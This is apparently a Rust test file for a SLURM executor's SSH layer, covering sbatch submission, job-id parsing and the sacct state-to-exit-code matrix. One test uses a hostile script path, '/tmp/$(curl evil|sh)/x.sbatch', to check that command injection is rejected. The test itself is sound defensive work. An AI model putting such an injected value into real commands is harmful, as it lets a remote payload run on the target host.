//! SLURM SSH-mock unit tests covering the sacct state-transition matrix.
//!
//! These tests exercise the layer that `slurm_live.rs` only reaches against
//! a real cluster. Every test runs against `FakeSshSession` — no SSH
//! binary, no SLURM daemon, no network. Gate matches `slurm_live.rs`.

#![cfg(feature = "slurm")]

use scripps_workflow_core::blocker::BlockerKind;
use scripps_workflow_harness::executor::slurm::polling::{query_job, JobState};
use scripps_workflow_harness::executor::slurm::sbatch::{parse_job_id, submit_sbatch};
use scripps_workflow_harness::executor::slurm::ssh::{FakeSshSession, SshOutcome, SshSession};

// ── helpers ───────────────────────────────────────────────────────────────

/// Stub the two-command `submit_sbatch` sequence:
///  1. The `mkdir -p … base64 -d > … chmod` staging write.
///  2. The `sbatch --parsable <path>` submit.
fn stub_submit(fake: &FakeSshSession, script_path: &str, sbatch_response: SshOutcome) {
    // Prefix match on "mkdir -p" covers the staging write regardless of
    // the exact base64 body — the staging command always starts with
    // `mkdir -p $(dirname <path>)`.
    fake.expect("mkdir -p", SshOutcome::success(""));
    fake.expect(format!("sbatch --parsable {script_path}"), sbatch_response);
}

/// Stub a `sacct -j <job_id> -n -P --format=…` call.
fn stub_sacct(fake: &FakeSshSession, job_id: &str, sacct_stdout: &str) {
    fake.expect(
        format!("sacct -j {job_id} -n -P --format=State,ExitCode,NodeList,Partition"),
        SshOutcome::success(sacct_stdout),
    );
}

// ── sbatch submit ─────────────────────────────────────────────────────────

/// The canonical happy path: `sbatch --parsable` emits a plain integer
/// job id; `submit_sbatch` must return it without modification.
#[test]
fn submit_parsable_returns_integer_job_id() {
    let fake = FakeSshSession::new("cluster");
    stub_submit(
        &fake,
        "/scratch/job-1.sbatch",
        SshOutcome::success("12345\n"),
    );

    let id = submit_sbatch(&fake, "/scratch/job-1.sbatch", "#!/bin/bash\necho hi\n").unwrap();
    assert_eq!(
        id, "12345",
        "job id must equal the integer in sbatch stdout"
    );
}

/// Federated SLURM clusters emit `JOBID;CLUSTER`. The semicolon-prefix
/// should be stripped so callers always receive a bare integer.
#[test]
fn submit_parsable_strips_cluster_suffix() {
    let fake = FakeSshSession::new("cluster");
    stub_submit(
        &fake,
        "/scratch/job-2.sbatch",
        SshOutcome::success("99901;prod\n"),
    );

    let id = submit_sbatch(&fake, "/scratch/job-2.sbatch", "#!/bin/bash\n").unwrap();
    assert_eq!(id, "99901");
}

/// When `sbatch` exits non-zero, `submit_sbatch` must return `Err` with
/// a message that names the command so operators can triage log output.
#[test]
fn submit_ssh_error_propagates_as_err() {
    let fake = FakeSshSession::new("cluster");
    stub_submit(
        &fake,
        "/scratch/job-3.sbatch",
        SshOutcome::failure("sbatch: error: Invalid partition specified", 1),
    );

    let err = submit_sbatch(&fake, "/scratch/job-3.sbatch", "#!/bin/bash\n").unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("sbatch submission failed"),
        "error must mention submission failure; got: {msg}"
    );
    assert!(
        msg.contains("Invalid partition"),
        "error must surface sbatch stderr; got: {msg}"
    );
}

/// `submit_sbatch` refuses script paths that fail the id-validator so a
/// malicious path like `/tmp/$(curl evil|sh)/x.sbatch` can never be
/// executed on the login node.
#[test]
fn submit_rejects_unsafe_script_path() {
    let fake = FakeSshSession::new("cluster");
    // No expect() stubs needed — the guard fires before any SSH call.
    let err = submit_sbatch(&fake, "/tmp/$(curl evil)/x.sbatch", "#!/bin/bash\n").unwrap_err();
    assert!(
        err.to_string().contains("unsafe script_path"),
        "must refuse hostile path; got: {}",
        err
    );
    assert!(
        fake.calls().is_empty(),
        "validator must refuse BEFORE issuing any SSH commands"
    );
}

// ── parse_job_id ──────────────────────────────────────────────────────────

/// Matrix of `sbatch --parsable` stdout shapes; all must round-trip
/// through `parse_job_id`.
#[test]
fn parse_job_id_accepts_valid_forms() {
    assert_eq!(parse_job_id("12345\n"), Some("12345".into()));
    assert_eq!(parse_job_id("  678  "), Some("678".into()));
    assert_eq!(parse_job_id("99901;prod\n"), Some("99901".into()));
}

#[test]
fn parse_job_id_rejects_invalid_forms() {
    assert!(parse_job_id("").is_none());
    assert!(parse_job_id("error: queue full").is_none());
    assert!(parse_job_id("foo;bar").is_none());
}

// ── sacct state matrix ────────────────────────────────────────────────────

/// `COMPLETED` (exit 0) — terminal success; exit code must be 0.
#[test]
fn sacct_completed_maps_to_success_exit_0() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "12345", "COMPLETED|0:0|node-07|normal\n");

    let row = query_job(&fake, "12345").unwrap().unwrap();
    assert_eq!(row.state, JobState::Completed);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 0);
    // No BlockerKind for a success state.
    assert!(row.state.to_blocker_kind(None, None, None, None).is_none());
}

/// `FAILED` (exit nonzero) — terminal failure; exit code propagated from
/// the sacct ExitCode field.
#[test]
fn sacct_failed_maps_to_nonzero_exit() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "22222", "FAILED|2:0|node-12|long\n");

    let row = query_job(&fake, "22222").unwrap().unwrap();
    assert_eq!(row.state, JobState::Failed);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 2);
    assert!(row.state.to_blocker_kind(None, None, None, None).is_none());
}

/// `OUT_OF_MEMORY` (OOM_KILL) — terminal; must produce
/// `BlockerKind::MemoryExhausted` with the supplied metrics, and exit 137
/// (SIGKILL convention).
#[test]
fn sacct_oom_maps_to_memory_exhausted_blocker() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "33333", "OUT_OF_MEMORY|0:9|gpu-03|gpu\n");

    let row = query_job(&fake, "33333").unwrap().unwrap();
    assert_eq!(row.state, JobState::OutOfMemory);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 137);

    let blocker = row
        .state
        .to_blocker_kind(Some(65_536), Some(32_768), None, None)
        .expect("OOM must produce a typed BlockerKind");
    match blocker {
        BlockerKind::MemoryExhausted {
            peak_memory_mb,
            limit_mb,
        } => {
            assert_eq!(peak_memory_mb, Some(65_536));
            assert_eq!(limit_mb, Some(32_768));
        }
        other => panic!("expected MemoryExhausted, got {other:?}"),
    }
}

/// `TIMEOUT` — terminal; must produce `BlockerKind::TimeExceeded` and
/// exit 124 (GNU timeout convention).
#[test]
fn sacct_timeout_maps_to_time_exceeded_blocker() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "44444", "TIMEOUT|0:0|node-01|normal\n");

    let row = query_job(&fake, "44444").unwrap().unwrap();
    assert_eq!(row.state, JobState::Timeout);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 124);

    let blocker = row
        .state
        .to_blocker_kind(None, None, Some(7_200), Some(7_200))
        .expect("TIMEOUT must produce a typed BlockerKind");
    match blocker {
        BlockerKind::TimeExceeded {
            wallclock_secs,
            time_limit_secs,
        } => {
            assert_eq!(wallclock_secs, Some(7_200));
            assert_eq!(time_limit_secs, Some(7_200));
        }
        other => panic!("expected TimeExceeded, got {other:?}"),
    }
}

/// `PREEMPTED` — terminal; SIGTERM convention (exit 143); no dedicated
/// BlockerKind (handled via generic ToolError envelope).
#[test]
fn sacct_preempted_maps_to_exit_143() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "55555", "PREEMPTED|0:15|node-02|normal\n");

    let row = query_job(&fake, "55555").unwrap().unwrap();
    assert_eq!(row.state, JobState::Preempted);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 143);
    assert!(row.state.to_blocker_kind(None, None, None, None).is_none());
}

/// `NODE_FAIL` — terminal; exit 125 (GNU `timeout --foreground` failure
/// convention, distinct from the job's own non-zero exit); no dedicated
/// BlockerKind.
#[test]
fn sacct_node_fail_maps_to_exit_125() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "66666", "NODE_FAIL|0:0|node-08|normal\n");

    let row = query_job(&fake, "66666").unwrap().unwrap();
    assert_eq!(row.state, JobState::NodeFail);
    assert!(row.state.is_terminal());
    assert_eq!(row.state.to_exit_code(row.exit_code), 125);
    assert!(row.state.to_blocker_kind(None, None, None, None).is_none());
}

/// `PENDING` — non-terminal; `query_job` must return it successfully and
/// `is_terminal()` must be false. This is the state a job sits in while
/// waiting in the scheduler queue; the harness poll loop keeps polling
/// until `max_queue_wait` is exceeded, at which point it cancels and
/// returns `Err` with a stalled-job message.
#[test]
fn sacct_pending_is_non_terminal() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "77777", "PENDING||(None)|normal\n");

    let row = query_job(&fake, "77777").unwrap().unwrap();
    assert_eq!(row.state, JobState::Pending);
    assert!(!row.state.is_terminal(), "PENDING must not be terminal");
    // Non-terminal sentinel exit code (-1) surfaces the bug loudly when
    // a caller accidentally passes a non-terminal state to to_exit_code.
    assert_eq!(row.state.to_exit_code(None), -1);
}

/// Empty sacct output (job not yet in accounting DB) — `query_job` must
/// return `Ok(None)` rather than `Err`. The harness poll loop treats
/// `None` as "keep polling" and retries.
#[test]
fn sacct_empty_output_returns_none_not_err() {
    let fake = FakeSshSession::new("cluster");
    stub_sacct(&fake, "88888", "");

    let result = query_job(&fake, "88888").unwrap();
    assert!(
        result.is_none(),
        "empty sacct must return Ok(None) so the poll loop retries"
    );
}

/// SSH transport failure on `sacct` — `query_job` must return `Err`
/// (not `Ok(None)`) so the harness loop can surface the diagnostic.
#[test]
fn sacct_ssh_transport_failure_returns_err() {
    let fake = FakeSshSession::new("cluster");
    fake.expect(
        "sacct -j 11111 -n -P --format=State,ExitCode,NodeList,Partition",
        SshOutcome::failure("slurm_load_jobs error: Invalid job id specified", 1),
    );

    let err = query_job(&fake, "11111").unwrap_err();
    assert!(
        err.to_string().contains("sacct 11111 failed"),
        "error must name the sacct call; got: {}",
        err
    );
}

/// SSH connection failure on `sbatch` submit — `submit_sbatch` must
/// return `Err` with a clear diagnostic before any SLURM state is
/// created.
#[test]
fn submit_ssh_connection_failure_returns_err_with_diagnostic() {
    let fake = FakeSshSession::new("cluster");
    // The staging write (mkdir/base64) fails with a connection-level error.
    fake.expect(
        "mkdir -p",
        SshOutcome::failure(
            "ssh: connect to host cluster port 22: Connection refused",
            255,
        ),
    );

    let err = submit_sbatch(&fake, "/scratch/job-cf.sbatch", "#!/bin/bash\necho hi\n").unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("failed to stage sbatch script"),
        "staging failure must be surfaced; got: {msg}"
    );
}

// ── polling simulation: Pending past queue wait ───────────────────────────

/// Verify that consecutive `query_job` calls behave correctly in a
/// poll loop. Use two separate fakes (one returning Pending, one
/// returning Completed) to demonstrate that the loop would eventually
/// reach a terminal state — `FakeSshSession` maps one response per
/// key, so per-call sequencing is exercised via separate instances.
#[test]
fn poll_loop_simulated_with_pending_then_completed_fakes() {
    // First poll: job is still queued.
    let fake_pending = FakeSshSession::new("cluster");
    stub_sacct(&fake_pending, "20001", "PENDING||(None)|normal\n");
    let row1 = query_job(&fake_pending, "20001").unwrap().unwrap();
    assert_eq!(row1.state, JobState::Pending);
    assert!(
        !row1.state.is_terminal(),
        "Pending must not be terminal — poll loop must continue"
    );

    // Next poll interval: job has completed.
    let fake_done = FakeSshSession::new("cluster");
    stub_sacct(&fake_done, "20001", "COMPLETED|0:0|node-04|normal\n");
    let row2 = query_job(&fake_done, "20001").unwrap().unwrap();
    assert_eq!(row2.state, JobState::Completed);
    assert!(row2.state.is_terminal());
    assert_eq!(row2.state.to_exit_code(row2.exit_code), 0);
}

/// Simulate a job that stays Pending past `max_queue_wait`. In production
/// the harness cancels via `scancel`; replicate the same call sequence
/// here to verify the cancellation command is well-formed.
#[test]
fn pending_past_deadline_results_in_scancel_call() {
    let fake = FakeSshSession::new("cluster");

    // sacct says Pending indefinitely.
    fake.expect(
        "sacct -j 30001 -n -P --format=State,ExitCode,NodeList,Partition",
        SshOutcome::success("PENDING||(None)|normal\n"),
    );
    // scancel completes successfully.
    fake.expect("scancel 30001", SshOutcome::success(""));

    // Simulate what poll_until_terminal does on deadline: one poll that
    // returns Pending, then a scancel.
    let row = query_job(&fake, "30001").unwrap().unwrap();
    assert!(!row.state.is_terminal());

    // Deadline exceeded — issue scancel.
    let cancel_out = fake.run("scancel 30001").unwrap();
    assert!(cancel_out.is_success());

    let calls = fake.calls();
    assert!(
        calls.iter().any(|c| c.contains("sacct -j 30001")),
        "sacct must have been polled"
    );
    assert!(
        calls.iter().any(|c| c == "scancel 30001"),
        "scancel must have been issued on deadline expiry; calls: {calls:?}"
    );
}

// ── full state-matrix coverage sweep ─────────────────────────────────────

/// Lock the full seven-state terminal matrix (COMPLETED / FAILED /
/// TIMEOUT / CANCELLED / OUT_OF_MEMORY / PREEMPTED / NODE_FAIL) in one
/// parameterized sweep. Verifies that:
///  - `parse_sacct_row` (via `query_job`) returns the correct `JobState`
///  - `is_terminal()` is true for all seven
///  - `to_exit_code` matches the harness-stable convention
///  - `to_blocker_kind` returns `Some` only for OOM and TIMEOUT
#[test]
fn full_terminal_state_matrix() {
    struct Case {
        sacct_stdout: &'static str,
        job_id: &'static str,
        expected_state: JobState,
        expected_exit: i32,
        expected_blocker: bool,
    }

    let cases = [
        Case {
            sacct_stdout: "COMPLETED|0:0|n|p\n",
            job_id: "40001",
            expected_state: JobState::Completed,
            expected_exit: 0,
            expected_blocker: false,
        },
        Case {
            sacct_stdout: "FAILED|1:0|n|p\n",
            job_id: "40002",
            expected_state: JobState::Failed,
            expected_exit: 1,
            expected_blocker: false,
        },
        Case {
            sacct_stdout: "TIMEOUT|0:0|n|p\n",
            job_id: "40003",
            expected_state: JobState::Timeout,
            expected_exit: 124,
            expected_blocker: true,
        },
        Case {
            sacct_stdout: "CANCELLED by 501|0:15|n|p\n",
            job_id: "40004",
            expected_state: JobState::Cancelled,
            expected_exit: 130,
            expected_blocker: false,
        },
        Case {
            sacct_stdout: "OUT_OF_MEMORY|0:9|n|p\n",
            job_id: "40005",
            expected_state: JobState::OutOfMemory,
            expected_exit: 137,
            expected_blocker: true,
        },
        Case {
            sacct_stdout: "PREEMPTED|0:15|n|p\n",
            job_id: "40006",
            expected_state: JobState::Preempted,
            expected_exit: 143,
            expected_blocker: false,
        },
        Case {
            sacct_stdout: "NODE_FAIL|0:0|n|p\n",
            job_id: "40007",
            expected_state: JobState::NodeFail,
            expected_exit: 125,
            expected_blocker: false,
        },
    ];

    for c in &cases {
        let fake = FakeSshSession::new("cluster");
        stub_sacct(&fake, c.job_id, c.sacct_stdout);

        let row = query_job(&fake, c.job_id)
            .unwrap_or_else(|e| panic!("query_job failed for {}: {e}", c.job_id))
            .unwrap_or_else(|| panic!("no row returned for job {}", c.job_id));

        assert_eq!(
            row.state, c.expected_state,
            "state mismatch for job {} (stdout: {:?})",
            c.job_id, c.sacct_stdout
        );
        assert!(
            row.state.is_terminal(),
            "state {:?} must be terminal for job {}",
            row.state,
            c.job_id
        );
        assert_eq!(
            row.state.to_exit_code(row.exit_code),
            c.expected_exit,
            "exit code mismatch for job {} ({:?})",
            c.job_id,
            c.expected_state
        );
        let has_blocker = row.state.to_blocker_kind(None, None, None, None).is_some();
        assert_eq!(
            has_blocker,
            c.expected_blocker,
            "blocker presence mismatch for job {} ({:?}): expected {} blocker",
            c.job_id,
            c.expected_state,
            if c.expected_blocker { "a" } else { "no" }
        );
    }
}
